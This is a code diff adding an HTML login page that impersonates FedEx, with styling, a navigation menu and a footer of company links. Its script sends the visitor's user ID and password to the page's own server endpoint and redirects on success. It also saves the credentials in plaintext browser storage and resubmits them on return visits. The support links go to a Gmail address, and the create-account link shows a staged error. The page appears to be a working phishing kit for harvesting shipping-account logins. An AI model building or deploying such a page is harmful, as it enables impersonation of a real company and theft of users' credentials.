@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>FedEx</title>
+    <base href="/" />
+    <link rel="stylesheet" href="fonts/css/all.css" />
+  </head>
+  <style>
+    * {
+      margin: 0;
+    }
+    .main-head {
+      padding-bottom: 7px;
+      border-bottom: 2px inset rgb(182, 180, 180);
+      box-shadow: 0px 1px 3px rgb(182, 180, 180);
+    }
+    .sub-head {
+      display: flex;
+      background-color: #460888;
+      width: 100%;
+      height: 70px;
+    }
+    .head-img {
+      display: inline-block;
+      height: 70px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-right: auto;
+    }
+    .head-img0 {
+      width: 100px;
+      height: 40px;
+      border: 1px solid;
+      border: #460888;
+    }
+    .sing-in-text-box {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-right: 5px;
+      font-size: 18px;
+      color: white;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    .sign-in-i {
+      display: inline-block;
+      height: 70px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .fa-user-circle {
+      color: white;
+      font-size: 25px;
+      font-weight: 200;
+    }
+    .menu-bar {
+      display: inline-block;
+      height: 70px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-right: 20px;
+      margin-left: 5px;
+    }
+    .fa-bars {
+      color: white;
+      font-size: 25px;
+    }
+    .menu-popup {
+      display: flex;
+      flex-direction: column;
+      gap: 35px;
+      position: absolute;
+      z-index: 10;
+      right: 0;
+      background-color: #460888;
+      transition: 300ms ease-in;
+      display: none;
+    }
+    .options-tap {
+      color: white;
+      padding-right: 20px;
+      padding-left: 20px;
+      display: flex;
+    }
+    .options-tap-text {
+      font-size: 18px;
+      font-family: Arial, Helvetica, sans-serif;
+      margin-right: auto;
+    }
+    .o-t {
+      padding-top: 25px;
+    }
+    .o-b {
+      padding-bottom: 25px;
+    }
+    .o-i-d {
+      font-size: 20px;
+    }
+    .login-content-box {
+      margin-top: 50px;
+    }
+    .login-text-box {
+      margin-top: 40px;
+      display: flex;
+      justify-content: center;
+    }
+    .login-text {
+      font-size: 17px;
+      margin-left: 5px;
+      margin-right: 5px;
+      font-family: Arial, Helvetica, sans-serif;
+      color: rgb(77, 75, 75);
+    }
+    .create-account-text-box {
+      margin-top: 30px;
+      display: flex;
+      justify-content: center;
+    }
+    .create-account-text {
+      font-size: 12px;
+      font-family: Arial, Helvetica, sans-serif;
+      color: rgb(67, 67, 196);
+    }
+    .login-in-box {
+      margin-top: 30px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      text-align: center;
+    }
+    .u-in-box {
+      display: flex;
+      justify-content: center;
+    }
+    .u-in {
+      width: 70%;
+      height: 30px;
+      border: 1px solid;
+      border-color: rgb(245, 242, 242);
+      background-color: rgb(245, 242, 242);
+    }
+    .remember-id-box {
+      margin-top: 20px;
+      display: flex;
+      justify-content: center;
+      gap: 5px;
+    }
+    .remember-check-box {
+      width: 20px;
+    }
+    .remember-check-box-text {
+      font-size: 12px;
+      font-weight: 200;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    .login-btw-box {
+      margin-top: 30px;
+      display: flex;
+      justify-content: center;
+    }
+    .login-btw {
+      display: block;
+      font-size: 15px;
+      font-family: Arial, Helvetica, sans-serif;
+      color: white;
+      background-color: orangered;
+      padding-top: 7px;
+      padding-bottom: 7px;
+      padding-left: 10px;
+      padding-right: 10px;
+    }
+    .login-help-box {
+      margin-top: 40px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .login-help-box-content {
+      display: flex;
+      justify-content: center;
+    }
+    .login-help-text {
+      font-size: 18px;
+      font-family: Arial, Helvetica, sans-serif;
+      font-weight: 200;
+    }
+    .login-help-customers-support {
+      font-size: 12px;
+      font-family: Arial, Helvetica, sans-serif;
+      color: rgb(67, 67, 196);
+    }
+    .l-end-div-bar-box {
+      display: flex;
+      flex-direction: column;
+      gap: clamp(100px, 65vw, 280px);
+    }
+    .l-e {
+      width: 100%;
+    }
+    .login-error-box {
+      margin-top: 120px;
+    }
+    .error-text-box {
+      width: 100%;
+      text-align: center;
+      margin-left: 5px;
+      margin-right: 5px;
+    }
+    .error-text {
+      font-size: 18px;
+      font-family: Arial, Helvetica, sans-serif;
+      font-weight: 300;
+    }
+    .error-retry-btw-box {
+      margin-top: 25px;
+      display: flex;
+      justify-content: center;
+    }
+    .error-retry-btw {
+      display: block;
+      font-size: 15px;
+      font-family: Arial, Helvetica, sans-serif;
+      color: white;
+      background-color: orangered;
+      padding-top: 7px;
+      padding-bottom: 7px;
+      padding-left: 10px;
+      padding-right: 10px;
+    }
+    .login-error-box {
+      display: none;
+    }
+    .end-tool-bar {
+      margin-top: 15px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      background-color: rgb(247, 246, 246);
+    }
+    .our-company-text {
+      margin-top: 20px;
+      margin-left: 10px;
+      font-size: 14px;
+      color: #460888;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    .about-fx {
+      margin-left: 10px;
+      font-weight: 300;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    .c-u {
+      margin-bottom: 10px;
+    }
+  </style>
+  <body>
+    <div class="login-page">
+      <div class="main-head">
+        <div class="sub-head">
+          <span class="head-img"
+            ><img class="head-img0" src="f-logo.jpg"
+          /></span>
+          <span class="sing-in-text-box"
+            ><h5 class="sing-in-text">Sign Up or Log in</h5></span
+          >
+          <span class="sign-in-i" data-page="signIn"
+            ><i class="fa fa-user-circle"></i
+          ></span>
+          <span class="menu-bar"><i class="fas fa-bars"></i></span>
+        </div>
+        <form class="signIn-form" action="/login" method="get"></form>
+      </div>
+      <div class="menu-popup">
+        <span class="options-tap o-t"
+          ><h5 class="options-tap-text">Shipping</h5>
+          <i class="fa fa-angle-down o-i-d"></i
+        ></span>
+        <span class="options-tap t-i-tap"
+          ><h5 class="options-tap-text">Tracking</h5>
+          <i class="fa fa-angle-down o-i-d"></i
+        ></span>
+        <span class="options-tap"
+          ><h5 class="options-tap-text">Design & Print</h5>
+          <i class="fa fa-angle-down o-i-d"></i
+        ></span>
+        <span class="options-tap"
+          ><h5 class="options-tap-text">Locations</h5>
+          <i class="fa fa-angle-down o-i-d"></i
+        ></span>
+        <span class="options-tap" data-support="support"
+          ><h5 class="options-tap-text">Support</h5>
+          <i class="fa fa-angle-down o-i-d"></i
+        ></span>
+        <span class="options-tap o-b"
+          ><h5 class="options-tap-text">Shipping</h5>
+          <i class="fa fa-angle-down o-i-d"></i
+        ></span>
+      </div>
+      <div class="login-content-box">
+        <div class="login-text-box">
+          <h3 class="login-text">Enter your user ID and password to log in</h3>
+        </div>
+        <div class="create-account-text-box">
+          <h5 class="create-account-text">
+            CREATE A USER ID FOR AN EXISTING ACCOUNT
+          </h5>
+        </div>
+        <div class="login-in-box">
+          <span class="u-in-box"
+            ><input class="user-id u-in" type="text" placeholder="USER ID"
+          /></span>
+          <span class="u-in-box"
+            ><input
+              class="user-password u-in"
+              type="text"
+              placeholder="PASSWORD"
+          /></span>
+        </div>
+        <div class="remember-id-box">
+          <input class="remember-check-box" type="checkbox" />
+          <h5 class="remember-check-box-text">Remember my user ID</h5>
+        </div>
+        <div class="login-btw-box">
+          <span class="login-btw">LOGIN</span>
+        </div>
+      </div>
+      <div class="login-error-box">
+        <div class="error-text-box">
+          <h5 class="error-text">
+            We are having trouble establishing a connection. please refresh the
+            page
+          </h5>
+        </div>
+        <div class="error-retry-btw-box">
+          <span class="error-retry-btw">RETRY</span>
+        </div>
+      </div>
+      <div class="l-end-div-bar-box">
+        <div class="login-help-box">
+          <span class="login-help-box-content"
+            ><h5 class="login-help-text">Need help?</h5></span
+          >
+          <span class="login-help-box-content"
+            ><h5 class="login-help-customers-support" data-support="support">
+              CUSTOMER SUPPORT
+            </h5></span
+          >
+        </div>
+        <div class="end-tool-bar l-e">
+          <h4 class="our-company-text">OUR COMPANY</h4>
+          <h5 class="about-fx">About FedEx</h5>
+          <h5 class="about-fx">Our Portfolio</h5>
+          <h5 class="about-fx">investor Relations</h5>
+          <h5 class="about-fx">Careers</h5>
+          <h5 class="about-fx">FedEx Blog</h5>
+          <h5 class="about-fx">Corporate Responsibility</h5>
+          <h5 class="about-fx">Newsroom</h5>
+          <h5 class="about-fx c-u" data-support="support">Contact Us</h5>
+        </div>
+      </div>
+    </div>
+    <form action="/user" class="user-p" method="get"></form>
+    <form action="/login" class="login-r" method="get"></form>
+    <form class="tracking-main" action="/" method="get"></form>
+    <a href="" target="_blank" class="support-link"></a>
+  </body>
+  <script>
+    const f = "fed";
+    document.addEventListener("click", (e) => {
+      const target = e.target.closest("[data-page]");
+      if (target) {
+        if (target.dataset.page === "signIn") {
+          document.querySelector(".signIn-form").submit();
+        }
+      }
+    });
+    document.addEventListener("click", (e) => {
+      const target = e.target.closest("[data-support]");
+      if (target) {
+        if (target.dataset.support === "support") {
+          const link = document.querySelector(".support-link");
+          link.href =
+            "mailto:fedexdays1@gmail.com?subject=Question%20about%20Package&body=Hello%0AI%20have%20a%20question%20about%20my%20package.";
+          link.click();
+        }
+      }
+    });
+    let dropDownMenuPass = false;
+    const dropDownMenu = document
+      .querySelector(".fa-bars")
+      .addEventListener("click", () => {
+        const dropDown = document.querySelector(".menu-popup");
+        if (!dropDownMenuPass) {
+          dropDown.style.display = "flex";
+          return (dropDownMenuPass = true);
+        } else {
+          dropDown.style.display = "none";
+          return (dropDownMenuPass = false);
+        }
+      });
+    const trackingMainBtw = document
+      .querySelector(".t-i-tap")
+      .addEventListener("click", () => {
+        document.querySelector(".tracking-main").submit();
+      });
+    const register = document
+      .querySelector(".create-account-text")
+      .addEventListener("click", () => {
+        setTimeout(() => {
+          const loginBox = (document.querySelector(
+            ".login-content-box"
+          ).style.display = "none");
+          const errorPage = (document.querySelector(
+            ".login-error-box"
+          ).style.display = "block");
+        }, 1000);
+      });
+    const retryBtw = document
+      .querySelector(".error-retry-btw")
+      .addEventListener("click", () => {
+        document.querySelector(".login-r").submit();
+      });
+    const loginBtw = document
+      .querySelector(".login-btw")
+      .addEventListener("click", () => {
+        login();
+      });
+    const tempData = JSON.parse(localStorage.getItem(f));
+    if (tempData) {
+      const validateP = async () => {
+        try {
+          const pCheck = await fetch("/p/v", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(tempData),
+          });
+          const res = await pCheck.json();
+          if (res.validation) {
+            const form = document.querySelector(".user-p");
+            form.action = res.url;
+            form.submit();
+          } else {
+            const loginBox = (document.querySelector(
+              ".login-content-box"
+            ).style.display = "none");
+            const errorPage = (document.querySelector(
+              ".login-error-box"
+            ).style.display = "block");
+          }
+        } catch (error) {
+          const loginBox = (document.querySelector(
+            ".login-content-box"
+          ).style.display = "none");
+          const errorPage = (document.querySelector(
+            ".login-error-box"
+          ).style.display = "block");
+        }
+      };
+      validateP();
+    }
+    async function login() {
+      const userID = document.querySelector(".user-id").value;
+      const userPassword = document.querySelector(".user-password").value;
+      try {
+        const data = {
+          uID: userID,
+          uP: userPassword,
+        };
+        const pCheck = await fetch("/p/v", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(data),
+        });
+        const res = await pCheck.json();
+        console.log(res);
+        if (res.validation) {
+          const passChecked = document.querySelector(
+            ".remember-check-box"
+          ).checked;
+          passChecked ? saveLoginInfor(data) : null;
+          const form = document.querySelector(".user-p");
+          form.action = res.url;
+          form.submit();
+        } else {
+          const loginBox = (document.querySelector(
+            ".login-content-box"
+          ).style.display = "none");
+          const errorPage = (document.querySelector(
+            ".login-error-box"
+          ).style.display = "block");
+        }
+      } catch (error) {
+        const loginBox = (document.querySelector(
+          ".login-content-box"
+        ).style.display = "none");
+        const errorPage = (document.querySelector(
+          ".login-error-box"
+        ).style.display = "block");
+      }
+    }
+    function saveLoginInfor(data) {
+      localStorage.setItem(f, JSON.stringify(data));
+    }
+  </script>
+</html>
